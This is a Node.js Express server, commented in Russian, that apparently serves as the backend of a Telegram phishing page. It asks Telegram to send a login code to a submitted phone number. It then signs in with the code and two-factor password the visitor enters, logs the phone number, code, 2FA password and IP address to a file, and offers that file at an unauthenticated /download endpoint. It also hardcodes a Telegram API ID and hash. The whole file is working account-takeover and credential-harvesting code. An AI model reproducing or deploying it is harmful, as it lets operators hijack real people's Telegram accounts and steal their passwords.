import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FILE = path.join('/tmp', 'data.txt');

const apiId = parseInt(process.env.API_ID) || 38819391;
const apiHash = process.env.API_HASH || '3460a50f4b56082066d92fa202bd6407';

console.log('🔑 API_ID:', apiId);
console.log('🔑 API_HASH:', apiHash ? '✅ установлен' : '❌ не установлен');
console.log('📂 DATA_FILE:', DATA_FILE);

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

const sessions = new Map();

// === 1. ОТПРАВКА КОДА ===
app.post('/api/phone', async (req, res) => {
    const { phone } = req.body;

    if (!phone || !/^\+\d{7,15}$/.test(phone)) {
        return res.status(400).json({ error: 'Invalid phone format' });
    }

    try {
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
            connectionRetries: 5,
        });

        await client.connect();
        const result = await client.sendCode(phone);

        sessions.set(phone, {
            phone_code_hash: result.phone_code_hash,
            client,
            timestamp: Date.now(),
        });

        console.log(`📱 Code sent to ${phone}`);
        res.json({ success: true });
    } catch (error) {
        console.error('Send code error:', error);
        res.status(500).json({ error: 'Failed to send code' });
    }
});

// === 2. ПРОВЕРКА КОДА ===
app.post('/api/verify', async (req, res) => {
    const { phone, code } = req.body;

    if (!phone || !code || code.length < 5) {
        return res.status(400).json({ error: 'Invalid data' });
    }

    const session = sessions.get(phone);
    if (!session) {
        return res.status(400).json({ error: 'Session not found' });
    }

    try {
        const { client, phone_code_hash } = session;

        const result = await client.signIn(phone, code, phone_code_hash);

        if (result) {
            const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
            fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
            console.log(`✅ Login success for ${phone}`);
            sessions.delete(phone);
            return res.json({ success: true, requires2FA: false });
        }
    } catch (error) {
        if (error.message?.includes('2FA')) {
            console.log(`🔐 2FA required for ${phone}`);
            return res.json({ success: true, requires2FA: true });
        }
        console.error('Verify error:', error);
        res.status(400).json({ error: 'Invalid code' });
    }
});

// === 3. 2FA ===
app.post('/api/2fa', async (req, res) => {
    const { phone, code, password } = req.body;

    if (!phone || !password) {
        return res.status(400).json({ error: 'Invalid 2FA data' });
    }

    const session = sessions.get(phone);
    if (!session) {
        return res.status(400).json({ error: 'Session not found' });
    }

    try {
        const { client } = session;
        await client.signIn({ password });

        const data = { phone, code, twofa_password: password, ip: req.ip, time: new Date().toISOString() };
        fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
        console.log(`🔐 2FA passed for ${phone}`);
        sessions.delete(phone);
        res.json({ success: true });
    } catch (error) {
        console.error('2FA error:', error);
        res.status(400).json({ error: 'Invalid 2FA password' });
    }
});

// === 4. СКАЧИВАНИЕ DATA.TXT ===
app.get('/download', (req, res) => {
    if (fs.existsSync(DATA_FILE)) {
        res.download(DATA_FILE, 'data.txt');
    } else {
        res.status(404).send('❌ Файл пока пуст.');
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});